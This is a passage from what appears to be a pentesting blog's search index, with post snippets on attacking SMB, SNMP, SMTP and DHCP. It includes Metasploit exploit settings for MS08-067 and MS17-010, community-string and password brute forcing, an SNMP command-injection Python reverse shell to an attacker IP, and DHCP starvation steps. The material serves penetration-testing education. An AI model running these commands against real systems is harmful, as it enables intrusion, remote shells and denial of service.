RRAS)nmap -sV -p445 --script=smb-vuln-ms06-025 --script-args unsafe=1 10.10.x.x#MS06-040: Vulnerability in Server Service Could Allow Remote Code Execution (921883) (uncredentialed check) [CVE-2006-3439]use exploit/windows/smb/ms06_040_netapi ***#MS07-029: Vulnerability in Windows DNS RPC Interface Could Allow Remote Code Execution (935966) [CVE-2007-1748] (Buffer overflow which can crash the RPC intrface in the DNS Server)nmap -sV -p445 --script=smb-vuln-ms07-029 --script-args unsafe=1 10.10.x.x#MS08-067: Microsoft Windows Server Service Crafted RPC Request Handling Remote Code Execution (958644) (uncredentialed check) [CVE-2008-4250] (Buffer overflow/RCE. Dangerous, can crash the target)nmap -sV -p445 --script=smb-vuln-ms08-067 --script-args unsafe=1 10.10.x.xnmap -sV -p445 --script=smb-vuln-conficker --script-args unsafe=1 10.10.x.x # (dangerous, can crash target)Exploit-DB: 7132.py ***msf &gt; use exploit/windows/smb/ms08_067_netapi ***#MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) [CVE-2010-2729] (Print vulnerability. Safe and can\\'t crash the target)nmap -sV -p445 --script=smb-vuln-ms10-061 --script-args unsafe=1 10.10.x.x#MS17-010: Security Update for Microsoft Windows SMB Server (4013389) (uncredentialed check) [CVE-2017-0143] (RCE, just checking if vulnerable)nmap -sV -p445 --script=smb-vuln-ms17-010 --script-args unsafe=1 10.10.x.xnmap -sV -p445 --script=smb2-vuln-uptime --script-args smb2-vuln-uptime.skip-os=true 10.10.x.xmsf &gt; use auxiliary/scanner/smb/smb_ms17_010msf &gt; use exploit/windows/smb/ms17_010_eternalbluemsf &gt; use exploit/windows/smb/ms17_010_psexec#(IMPORTANT MS17_010_PSEXEC is a staged payload, means you need meterpreter !)#(IMPORTANT 2, if object can\\'t be found, try to modify your target !)set SHARE ADMIN$set SMBDomain secybr.localset ALLOW_GUEST trueset LPORT 445set LHOST 10.10.y.yset RHOST 10.10.x.xset TARGET 3 #(TARGET 1 = PowerShell / TARGET 2 = Native / TARGET 3 = MOF =&gt; share ADMIN$)set PAYLOAD windows/shell/reverse_tcpset VERBOSE trueset DBGTRACE trueset EXITFUNC threadexploit -j#Trans2open Exploitation# Samba 2.2.X are usually vulnerable to trans2openmsf &gt; use exploit/linux/samba/trans2openset VERBOSE trueset PAYLOAD linux/x86/shell_reverse_tcpset RHOST 10.10.x.xset LPORT 443set LHOST IPexploit -j -z#Samba 3.4.5 Symlink Directory Traversal# You can mount the root fiilesystem to a share you can accesshttps://www.exploit-db.com/exploits/33599# Using metasploithttps://www.exploit-db.com/exploits/33598msf &gt; use auxiliary/admin/smb/samba_symlink/traversal" }, { "title": "SNMP Pentesting Best Practicies", "url": "/posts/snmp-pentesting-best-practicies/", "categories": "pentesting protocols, snmp", "tags": "pentesting, snmp, best practicies", "date": "2022-06-07 00:00:00 +0300", "snippet": "SNMP SNMP usually uses ports 161,162What is SNMP?SNMP protocol is an application layer protocol defined by the Internet Architecture Board in RFC1157. SNMP is used to exchange management information between network devices. It is one of the most common protocols used for network management. SNMP is part of the Transmission Control Protocol/Internet Protocol (TCP/IP) suite as defined by the Internet Engineering Task Force.Organizations use SNMP to monitor and manage devices on a local area network (LAN) or wide area network (WAN). Most network devices in the market come bundled with SNMP agents. If not, some devices also allow network admins to install the agents.SNMP generally uses User Datagram Protocol (UDP) port number 161/162. An SNMP port is the SNMP communication endpoint. It is a logical construct that identifies SNMP data transfer. SNMP message transfer happens via UDP. The Transport Layer Security (TLS) or Datagram Transport Layer Security (DTLS) protocols are also used at times.PORT STATE SERVICE REASON VERSION161/udp open snmp udp-response ttl 244 ciscoSystems SNMPv3 server (public)MIBMIB stands for Management Information Base and is a collection of information organized hierarchically. These are accessed using a protocol such as SNMP. There are two types of MIBs: scalar and tabular.Scalar objects define a single object instance whereas tabular objects define multiple related object instances grouped in MIB tables.OIDsOIDs stands for Object Identifiers. OIDs uniquely identify managed objects in a MIB hierarchy. This can be depicted as a tree, the levels of which are assigned by different organizations. Top level MIB object IDs (OIDs) belong to different standard organizations.Vendors define private branches including managed objects for their own products.SNMP Pentesting Shodan search query : port:161,162 There are some well-known OIDs like the ones inside 1.3.6.1.2.1 that references MIB-2 defined Simple Network Management Protocol (SNMP) variables. And from the OIDs pending from this one you can obtain some interesting host data (system data, network data, processes data…)OID Example1 . 3 . 6 . 1 . 4 . 1 . 1452 . 1 . 2 . 5 . 1 . 3. 21 . 1 . 4 . 7Here is a breakdown of this address. 1 – this is called the ISO and it establishes that this is an OID. This is why all OIDs start with “1” 3 – this is called ORG and it is used to specify the organization that built the device. 6 – this is the dod or the Department of Defense which is the organization that established the Internet first. 1 – this is the value of the internet to denote that all communications will happen through the Internet. 4 – this value determines that this device is made by a private organization and not a government one. 1 – this value denotes that the device is made by an enterprise or a business entity.These first six values tend to be the same for all devices and they give you the basic information about them. This sequence of numbers will be the same for all OIDs, except when the device is made by the government.Moving on to the next set of numbers. 1452 – gives the name of the organization that manufactured this device. 1 – explains the type of device. In this case, it is an alarm clock. 2 – determines that this device is a remote terminal unit.The rest of the values give specific information about the device. 5 – denotes a discrete alarm point. 1 – specific point in the device 3 – port 21 – address of the port 1 – display for the port 4 – point number 7 – state of the point(Example take from here)SNMP VersionsThere are 2 important versions of SNMP: SNMPv1: Main one, it is still the most frequent, the authentication is based on a string (community string) that travels in plain-text (all the information travels in plain text). Version 2 and 2c send the traffic in plain text also and uses a community string as authentication. SNMPv3: Uses a better authentication form and the information travels encrypted using (dictionary attack could be performed but would be much harder to find the correct creds that inn SNMPv1 and v2).Community StringsAs mentioned before, in order to access the information saved on the MIB you need to know the community string on versions 1 and 2/2c and the credentials on version 3.The are 2 types of community strings: public mainly read only functions private Read/Write in generalNote that the writability of an OID depends on the community string used, so even if you find that “public” is being used, you could be able to write some values. Also, there may exist objects which are always “Read Only”.If you try to write an object a noSuchName or readOnly error is received.In versions 1 and 2/2c if you to use a bad community string the server wont respond. So, if it responds, a valid community strings was used.Ports The SNMP agent receives requests on UDP port 161. The manager receives notifications (Traps and InformRequests) on port 162. When used with Transport Layer Security or Datagram Transport Layer Security, requests are received on port 10161 and notifications are sent to port 10162.Brute-Force Community String (v1 and v2c)To guess the community string you could perform a dictionary attack..msf&gt; use auxiliary/scanner/snmp/snmp_login # Metasploitnmap -sU --script snmp-brute 192.168.x.x [--script-args snmp-brute.communitiesdb=&lt;wordlist&gt; ]onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 192.168.x.xhydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmpEnumerating SNMP# netcat banner grabbingnc -nv 10.10.x.x 161# banner grabbing with nmapnmap -sU -p 161 -sV 10.10.x.xnmap -vv -sV --version-intensity=5 -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 192.168.x.x# Detection SNMP services in VLAN'sonesixtyone 10.10.x.x/24 publicRead info with snmpchecksnmp-check 10.10.x.x -c publicEnumeration with snmpwalksnmpwalk -v2c -c public 10.10.x.xsnmpwalk -v2c -c public 10.10.x.x 1.3.6.1.2.1.25.4.2.1.2# You can talk SNMP with SNMP OID'sWindows RUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2Windows INSTALLED SOFTWARE 1.3.6.1.2.1.25.6.3.1.2Windows SYSTEM INFO 1.3.6.1.2.1.1.1Windows HOSTNAME 1.3.6.1.2.1.1.5Windows DOMAIN 1.3.6.1.4.1.77.1.4.1Windows UPTIME 1.3.6.1.2.1.1.3Windows USERS 1.3.6.1.4.1.77.1.2.25Windows SHARES 1.3.6.1.4.1.77.1.2.27Windows DISKS 1.3.6.1.2.1.25.2.3.1.3Windows SERVICES 1.3.6.1.4.1.77.1.2.3.1.1Windows LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0Windows LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0Linux RUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2Linux SYSTEM INFO 1.3.6.1.2.1.1.1Linux HOSTNAME 1.3.6.1.2.1.1.5Linux UPTIME 1.3.6.1.2.1.1.3Linux MOUNTPOINTS 1.3.6.1.2.1.25.2.3.1.3Linux RUNNING SOFTWARE PATHS 1.3.6.1.2.1.25.4.2.1.4Linux LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0Linux LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0Enumeration with snmpstatussnmpstatus -v2c -c 'public' 10.10.x.xIt is recommanded to install the following to see whats does mean each OID gathered from the device:apt-get install snmp-mibs-downloaderdownload-mibsIf you know a valid community string, you can access the data using SNMPWalk or SNMP-Check:snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP]snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] 1.3.6.1.2.1.4.34.1.3 #Get IPv6, needed dec2hexsnmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects #get extendedsnmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] .1 #Enum allsnmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]nmap --script \"snmp* and not snmp-brute\" &lt;target&gt;Thanks to extended queries (download-mibs), it is possible to enumerate even more about the system with the following command :snmpwalk -v X -c public &lt;IP&gt; NET-SNMP-EXTEND-MIB::nsExtendOutputFullSNMP has a lot of information about the host and things that you may find interesting are: Network interfaces (IPv4 and IPv6 address), Usernames, Uptime, Server/OS version, and processes running (may contain passwords).From SNMP to RCEIf you have the string that allows you to write values inside the SNMP service, you may be able to abuse it to execute commands.SNMP is sometimes overseen by the administrator of the device or server where it is left in a default configuration. SNMP community with write permissions (rwcommunity) on the Linux operating system can be abused to let the attacker execute a command on the server.Extending the ServicesWhile you are not able to modify existing entries that were configured in snmpd.conf, it is possible to add additional commands over SNMP, because the “MAX-ACCESS” permission setting in the MIB definition is set to “read-create”Adding a new command basically works by appending an additional row to the “nsExtendObjects” table.snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \\'nsExtendStatus.\"evilcommand\"' = createAndGo \\'nsExtendCommand.\"evilcommand\"' = /bin/echo \\'nsExtendArgs.\"evilcommand\"' = 'hello world'Injecting a command to run on the SNMP service. NET-SNMP-EXTEND-MIB requires that you always provide the absolute path to the executable. The called binary/script must also exist and be executable.Executing the command that we injected to the SNMP by enumerating it using snmpwalksnmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjectsShowing that the command is /bin/echoThe command will be executed when the it is read. run-on-read()The command /bin/echo “hello rio is here” was executed during our snmpwalk readGetting the Shell from Net-SNMP ExtendIn this section, I would like to discuss how to gain a server shell to control the server.You can use python script developed by mxrch that can be downloaded from https://github.com/mxrch/snmp-shell.gitYou can install the pre-requisite to run this:sudo apt install snmp snmp-mibs-downloader rlwrap -ygit clone https://github.com/mxrch/snmp-shellcd snmp-shellsudo python3 -m pip install -r requirements.txtCreating reverse shellYou can also create reverse shell manually by injecting the command below into the SNMPsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus.\"command10\"' = createAndGo 'nsExtendCommand.\"command10\"' = /usr/bin/python3.6 'nsExtendArgs.\"command10\"' = '-c \"import sys,socket,os,pty;s=socket.socket();s.connect((\\\"10.10.14.84\\\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/sh\\\")\"'run the snmpwalk to trigger the command executionOur netcat receives the reverseshell connection from the victim that allow us to gain control over the victim machineMassive SNMPBraa is a mass SNMP scanner. The intended usage of such a tool is, of course, making SNMP queries – but unlike snmpwalk from net-snmp, it is able to query dozens or hundreds of hosts simultaneously, and in a single process. Thus, it consumes very few system resources and does the scanning VERY fast.Braa implements its OWN snmp stack, so it does NOT need any SNMP libraries like net-snmp.Syntax: braa [Community-string]@[IP of SNMP server]:[iso id]braa ignite123@192.168.1.125:.1.3.6.*This can extract a lot MB of information that you cannot process manually.So, lets look for the most interesting information (from https://blog.rapid7.com/2016/05/05/snmp-data-harvesting-during-penetration-testing/)DevicesOne of the first things I do is extract the sysDesc .1.3.6.1.2.1.1.1.0 MIB data from each file to determine what devices I have harvested information from. This can easily be done using the following grep command:grep \".1.3.6.1.2.1.1.1.0\" *.snmpIdentify private stringAs an example, if I can identify the private community string used by an organization on their Cisco IOS routers, then I could possibly use that community string to extract the running configurations from those routers. The best method for finding such data has often been related to SNMP Trap data. So again, using the following grep we can parse through a lot of MIB data quickly searching for the key word of “trap”:grep -i \"trap\" *.snmpUsernames/passwordsAnother area of interest is logs, I have discovered that there are some devices that hold logs within the MIB tables. These logs can also contain failed logon attempts. Think about the last time you logged into a device via Telnet or SSH and inadvertently entered your password as the username. I typically search for key words such as fail, failed or login and examine that data to see if there is anything of value.grep -i \"login\\|fail\" *.snmpEmailsgrep -E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\b\" *.snmpModifying SNMP valuesYou can use NetScanTools to modify values. You will need to know the private string in order to do so.SpoofingIf there is an ACL that only allows some IPs to query the SMNP service, you can spoof one of this addresses inside the UDP packet an sniff the traffic.Examine SNMP Configuration files snmp.conf snmpd.conf snmp-config.xml" }, { "title": "SMTP Pentesting Best Practices", "url": "/posts/smtp-pentesting-best-practices/", "categories": "pentesting protocols, smtp", "tags": "pentesting, smtp, best practicies", "date": "2022-06-07 00:00:00 +0300", "snippet": "SMTP SMTP usually uses ports 25, 465, 587, 2525, 2526What is SMTP?SMTP, which stands for Simple Mail Transfer Protocol, is an email protocol used for sending email messages from one email account to another via the internet.Email protocols are sets of rules that let different email clients and accounts easily exchange information, and SMTP is one of the most common ones alongside POP and IMAP. It is also the only dedicated protocol for sending emails. Most email clients—including Outlook, Apple Mail, Gmail, and Yahoo Mail—rely on SMTP to “push” or send messages from a sender to a recipient.PORT STATE SERVICE VERSION25/tcp open smtpSender Policy Framework (SPF)Sender Policy Framework (SPF) provides a mechanism that allows MTAs to check if a host sending an email is authorized.Then, the organisations can define a list of authorised mail servers and the MTAs can query for this lists to check if the email was spoofed or not.In order to define IP addresses/ranges, domains and others that are allowed to send email on behalf a domain name, different “Mechanism” cam appear in the SPF registry.It SPF policy of the domain indicated in the redirect Mechanism will be used.It’s also possible to identify Qualifiers that indicates what should be done if a mechanism is matched. By default, the qualifier “+” is used (so if any mechanism is matched, that means it’s allowed).You usually will note at the end of each SPF policy something like: ~all or -all. This is used to indicate that if the sender doesn’t match any SPF policy, you should tag the email as untrusted (~) or reject (-) the email.QualifiersEach mechanism can be combined with one of four qualifiers: + for a PASS result. This can be omitted; e.g., +mx is the same as mx. ? for a NEUTRAL result interpreted like NONE (no policy). ~ (tilde) for SOFTFAIL, a debugging aid between NEUTRAL and FAIL. Typically, messages that return a SOFTFAIL are accepted but tagged. - (minus) for FAIL, the mail should be rejected (see below).In the following example you can read the SPF policy of google.com. Note how the first SPF policy includes SPF policies of other domains:kali@kali:~$ dig txt google.com | grep spfgoogle.com. 235 IN TXT \"v=spf1 include:_spf.google.com ~all\"kali@kali:~$ dig txt _spf.google.com | grep spf; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.7-Ubuntu &lt;&lt;&gt;&gt; txt _spf.google.com;_spf.google.com. IN TXT_spf.google.com. 235 IN TXT \"v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all\"kali@kali:~$ dig txt _netblocks.google.com | grep spf_netblocks.google.com. 1606 IN TXT \"v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all\"kali@kali:~$ dig txt _netblocks2.google.com | grep spf_netblocks2.google.com. 1908 IN TXT \"v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all\"kali@kali:~$ dig txt _netblocks3.google.com | grep spf_netblocks3.google.com. 1903 IN TXT \"v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all\"Traditionally it was possible to spoof any domain name that didn’t have a correct/any SPF record. Nowadays, if email comes from a domain without a valid SPF record is probably going to be rejected/marked as untrusted automatically.To check the SPF of a domain you can use online tools like: https://www.kitterman.com/spf/validate.htmlDomainKeys Identified Mail (DKIM)DomainKeys Identified Mail (DKIM) is a mechanism by which outbound email is signed and validated by foreign MTAs upon retrieving a domain’s public key via DNS. The DKIM public key is held within a TXT record for a domain; however, you must know both the selector and domain name to retrieve it.Then, to ask for the key you need the domain name and the selector of the mail from the mail header DKIM-Signature for example: d=gmail.com;s=20120113dig 20120113._domainkey.gmail.com TXT | grep p=20120113._domainkey.gmail.com. 280 IN TXT \"k=rsa\\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3DMARCDomain-based Message Authentication, Reporting &amp; Conformance (DMARC) is a method of mail authentication that expands upon SPF and DKIM. Policies instruct mail servers how to process email for a given domain and report upon actions performed.To obtain the DMARC record, you need to query the subdomain _dmarcroot@kali:~# dig _dmarc.yahoo.com txt | grep DMARC_dmarc.yahoo.com. 1785 IN TXT \"v=DMARC1\\; p=reject\\; sp=none\\; pct=100\\; rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\\;\"root@kali:~# dig _dmarc.google.com txt | grep DMARC_dmarc.google.com. 600 IN TXT \"v=DMARC1\\; p=quarantine\\; rua=mailto:mailauth-reports@google.com\"root@kali:~# dig _dmarc.paypal.com txt | grep DMARC_dmarc.paypal.com. 300 IN TXT \"v=DMARC1\\; p=reject\\; rua=mailto:d@rua.agari.com\\; ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com\"PayPal and Yahoo instruct mail servers to reject messages that contain invalid DKIM signatures or do not originate from their networks. Notifications are then sent to the respective email addresses within each organization. Google is configured in a similar way, although it instructs mail servers to quarantine messages and not outright reject them.DMARC tags Tag Name Purpose Sample v Protocol version v=DMARC1 pct Percentage of messages subjected to filtering pct=20 ruf Reporting URI for forensic reports ruf=mailto:authfail@example.com rua Reporting URI of aggregate reports rua=mailto:aggrep@example.com p Policy for organizational domain p=quarantine sp Policy for subdomains of the OD sp=reject adkimadkim Alignment mode for DKIM adkim=s aspf Alignment mode for SPF aspf=r SubdomainsYou need to have separate SPF records for each subdomain you wish to send mail from.The following was originally posted on openspf.org, which used to be a great resource for this kind of thing.This makes sense - a subdomain may very well be in a different geographical location and have a very different SPF definition.** https://github.com/serain/mailspoof Check for SPF and DMARC misconfigurations https://pypi.org/project/checkdmarc/ Automatically get SPF and DMARC configsCheck SpoofingYou can use the online tool http://www.anonymailer.net/ to send you an email spoofing an address and check if reaches you email.**Other phishing indicators Domain’s age Links pointing to IP addresses Link manipulation techniques Suspicious (uncommon) attachments Broken email content Values used that are different to those of the mail headers Existence of a valid and trusted SSL certificate Submission of the page to web content filtering sitesSimple SMTP Commands#HELOIt’s the first SMTP command: is starts the conversation identifying the sender server and is generally followed by its domain name.#EHLOAn alternative command to start the conversation, underlying that the server is using the Extended SMTP protocol.#MAIL FROMWith this SMTP command the operations begin: the sender states the source email address in the “From” field and actually starts the email transfer.#RCPT TOIt identifies the recipient of the email; if there are more than one, the command is simply repeated address by address.#SIZEThis SMTP command informs the remote server about the estimated size (in terms of bytes) of the attached email. It can also be used to report the maximum size of a message to be accepted by the server.#DATAWith the DATA command the email content begins to be transferred; it’s generally followed by a 354 reply code given by the server, giving the permission to start the actual transmission.#VRFYThe server is asked to verify whether a particular email address or username actually exists.#TURNThis command is used to invert roles between the client and the server, without the need to run a new connaction.#AUTHWith the AUTH command, the client authenticates itself to the server, giving its username and password. It’s another layer of security to guarantee a proper transmission.#RSETIt communicates the server that the ongoing email transmission is going to be terminated, though the SMTP conversation won’t be closed (like in the case of QUIT).#EXPNThis SMTP command asks for a confirmation about the identification of a mailing list.#HELPIt’s a client’s request for some information that can be useful for the a successful transfer of the email.#QUITIt terminates the SMTP conversation.SMTP Pentesting Shodan search query : port:25,465,587,2525,2526 Information Gathering#Banner GrabbingPORT STATE SERVICE REASON VERSION25/tcp open smtp syn-ack Microsoft ESMTP 6.0.3790.3959Basic Connection#SMTPnc -vn &lt;IP&gt; 25#SMTPSopenssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls commandopenssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587Finding MX servers of an organisationdig +short mx google.comFinding SMTP Commandsnmap -p25 --script smtp-commands 10.10.10.10NTLM Auth - Information disclosureIf the server supports NTLM auth (Windows) you can obtain sensitive info (versions). More info here.root@kali: telnet example.com 587 220 example.com SMTP Server Banner &gt;&gt; HELO 250 example.com Hello [x.x.x.x] &gt;&gt; AUTH NTLM 334 NTLM supported &gt;&gt; TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAAOr automate this with nmap plugin smtp-ntlm-info.nseSniffingCheck if you sniff some password from the packets to port 25CredentialsAuthentication Bruteforcinghydra -l root -P passwords.txt [-t 32] &lt;IP&gt; sshncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M sshEnumeration Username With Bruteforcesmtp-user-enum -M VRFY -U users.txt -t &lt;IP&gt;Example smtp-user-enum.pl output for ‘VRFY’ command.Authentication is not always neededRCPT TO$ telnet 10.0.10.1 25Trying 10.0.10.1...Connected to 10.0.10.1.Escape character is '^]'.220 myhost ESMTP Sendmail 8.9.3HELO x250 myhost Hello [10.0.0.99], pleased to meet youMAIL FROM:test@test.org250 2.1.0 test@test.org... Sender okRCPT TO:test550 5.1.1 test... User unknownRCPT TO:admin550 5.1.1 admin... User unknownRCPT TO:ed250 2.1.5 ed... Recipient okVRFY$ telnet 10.0.0.1 25Trying 10.0.0.1...Connected to 10.0.0.1.Escape character is '^]'.220 myhost ESMTP Sendmail 8.9.3HELO501 HELO requires domain addressHELO x250 myhost Hello [10.0.0.99], pleased to meet youVRFY root250 Super-User &lt;root@myhost&gt;VRFY blah550 blah... User unknownEXPN$ telnet 10.0.10.1 25Trying 10.0.10.1...Connected to 10.0.10.1.Escape character is '^]'.220 myhost ESMTP Sendmail 8.9.3HELO501 HELO requires domain addressHELO xEXPN test550 5.1.1 test... User unknownEXPN root250 2.1.5 &lt;ed.williams@myhost&gt;EXPN sshd250 2.1.5 sshd privsep &lt;sshd@mail2&gt;Another techniquemsf &gt; use auxiliary/scanner/smtp/smtp_enumsmtp-user-enum: smtp-user-enum -M &lt;MODE&gt; -u &lt;USER&gt; -t &lt;IP&gt;nmap --script smtp-enum-users &lt;IP&gt;SMTP SpoofingMost of this section was extracted from the book Network Security Assessment 3rd Edition.SMTP messages are easily spoofed, and so organizations use SPF, DKIM, and DMARC features to prevent parties from sending unauthorised email.A complete guide of these countermeasures can be found in https://seanthegeek.net/459/demystifying-dmarc/If you can send data via SMTP read this." }, { "title": "DHCP Pentesting Best Practices", "url": "/posts/dhcp-pentesting-best-practices/", "categories": "pentesting protocols, dhcp", "tags": "pentesting, dhcp, best practicies", "date": "2022-06-07 00:00:00 +0300", "snippet": "DHCP DHCP usually uses ports 67, 68What is DHCP?The answer to “What is DHCP?” is that it’s the standard mechanism to dynamically assign IP addresses within a network. It stands for Dynamic Host Configuration Protocol.IP, or Internet Protocol, addressing is a logical means of assigning addresses to devices on a network. Each device connected to a network requires a unique IP address.At home, dynamic host configuration protocol (DHCP) assigns IP addresses to your smartphones, laptops, tablets, and devices like doorbell cameras. When you use wifi on your home network, typically your router is a DHCP server.In a large enterprise setting, a DHCP server is usually a dedicated computer. By simplifying IP address management, it saves money, is more secure, and doesn’t eat up valuable admin time.In this glossary entry, we’ll explore the fundamentals of how DHCP works. Then, we’ll take a deeper look at two aspects: dynamic addressing and the communications protocol.PORT STATE SERVICE VERSION68/udp open dhcp How does DHCP work?DHCP is a network management protocol. A client device (or DHCP client), such as a laptop, joins a network and requests an IP address. The request is made to a DHCP server.These servers are often configured with redundancy often called DHCP failover or clustering among other network servers. Servers can run on both IPv4 and IPv6 networks.The server will quickly and automatically assign an IP address and some related network configuration parameters. Once the device has accepted the assignment, it can communicate with both the internal network and the public internet.Relevant parametersIn addition to assigning IP addresses, these servers also provide relevant parameters, known as DHCP options. The Internet Assigned Numbers Authority (IANA), the global coordinator of IP addresses, defines available DHCP parameters.Options number in the hundreds. Key among them is how long the IP address can be used—known as the lease time. They also include the default gateway, its subnet mask, and its DNS server.Some additional definitionsTo clarify, let’s quickly define some of these terms we just mentioned: A default gateway transfers data back and forth between the local network and the internet, or between local subnets. IP networking uses a subnet mask to separate the host address and the network address portions of an IP address. A DNS server resolves names to IP addresses, translating domain names that we easily remember, like secybr.com, into IP addresses like 185.199.108.153.Dynamic IP addressing with DHCPThe assignment of IP addresses happens dynamically within a given address range. As a result, a device connected to the network doesn’t have a forever address. The IP address can periodically change as its lease time expires unless the lease is successfully renewed.For services that always need to be on, a static IP address is often a better option. Corporate enterprises commonly use static IP addresses for hardware like mail servers. Certainly, a DHCP server should have a static IP address.However, there are drawbacks to dedicating a specific IP address to a device or service. A network administrator must manually assign, configure, and track the IP address. It’s a time-consuming task. Oftentimes, it requires the admin to physically be with the device.Meanwhile, dynamic IP addresses are usually the preferred choice because they: Cost less to manage than static IP addresses; May offer more privacy and security with a constantly changing IP address; and Don’t require manual administration when a device roams from one subnet to another.DHCP communications protocolCommunications to fulfill a DHCP request involves both the server and client. Furthermore, a relay agent or IP helper often facilitates communication between the two. Relay agents receive broadcast DHCP messages from clients and then re-send those messages with configuration information to servers.Communication happens via small units of data, called packets, that are routed through a network. Networking protocols like IP govern all its rules.Most of the time, communication occurs in four steps. Briefly, they are: A discover packet is sent from the client to the server. The server replies to the client with a DHCP offer packet containing an IP address. The client receives and validates the offer, then sends a request packet back to the server to accept the address. The server sends an acknowledgement packet back to the client to confirm the chosen IP address.With this in mind, one final point: DHCP alongside DNS and IP address management (IPAM) are together known as DDI. Want to know how to define DDI or how it works to form a complete management solution? The BlueCat platform is the place to start.It works with DHCP client/server architecture. Packets between client/server are carried by UDP protocol. In the scenario where the client first joins the network, the client prepares a DHCP Discovery packet and sends it to the network. The purpose of this message is to find the DHCP server on the network.Receiving the DHCP Discovery packet, the DHCP server sends a DHCP Offer packet containing an appropriate IP address to the computer sending the packet and how long it can use this IP address (Lease Time).In the third step, the client -usually accepting the IP address and Lease Time specified in the DHCP Offer packet- sends the DHCP Request packet containing the request IP address and Lease Time to the DHCP server.In the last step, the server allocates the IP address in the DHCP Request packet to the client, if appropriate. The allocated IP address can be allocated to another device if it is not renewed by the client at the end of the Lease Time. For this reason, the client requests the renewal of the IP address it uses by communicating with the DHCP server when half of the IP’s Lease Time expires. Unless there is a very special situation, the DHCP server accepts the request and extends the Lease Time. This process continues by being triggered by the client and the first IP received is protected.In some cases, we may want a device on the network (eg web server) to always receive the same IP address. In this case, the MAC address of the relevant device is matched with the IP address on the DHCP server, so that the selected IP address is included in the DHCP Offer packages sent from the server.The dnsmasq project, which we will examine in detail in one of the next floods, is very suitable for observing and experimentally using the DHCP protocol on Linux and macOS.DHCP Pentesting Shodan search query : port:67,68 Banner Grabbing#Nmap Scripts:sudo nmap -sU -p68 --script broadcast-dhcp-discover 10.10.x.xCommon DHCP VulnerabilitiesDHCP DoS AttackTwo types of DoS can be performed against DHCP servers. The first consists of simulating enough fake hosts to use all possible IP addresses.This attack will only work if you can see the DHCP server’s responses and complete the protocol (Discover (Build) –&gt; Offer (server) –&gt; Request (Build) –&gt; ACK (server)). For example, this is not possible in Wifi networks.You can use yersinia for DHCP DoS Attackpress g and select the DHCP.press x, to select an attack ( eXecute attack ) and select Punk 1 – Sending DISCOVER packet.The attack started.To stop the attacks press l, select the active attack and press the Enter. A more automated way to do this is to use the DHCPig tool.GitHub - kamorin/DHCPig: DHCP exhaustion script written in python using scapy network libraryYou can use the aforementioned DoS attacks to force clients to take new leases within the environment and consume legitimate servers to become unresponsive. So when the legitimate tries to reconnect, you can get the malicious values mentioned in the next attack to the server. You can use the Responder DHCP script (/usr/share/responder/DHCP.py) to create a fake DHCP server. Setting up a malicious gateway is not ideal because the compromised connection is only half-duplex (i.e. we capture egress packets from the client, but not responses from the legitimate gateway). So I would recommend setting up a fake DNS or WPAD server specifically to capture HTTP traffic and credentials.DHCP Starvation AttackIf too many DHCPRequest packets are sent to the network, the attacker can keep the addresses allocated to the DHCP Server busy for a long time. Thus, the DHCP pool resources of the clients on the targeted network become unavailable. That’s why DHCP Starvation is called DOS 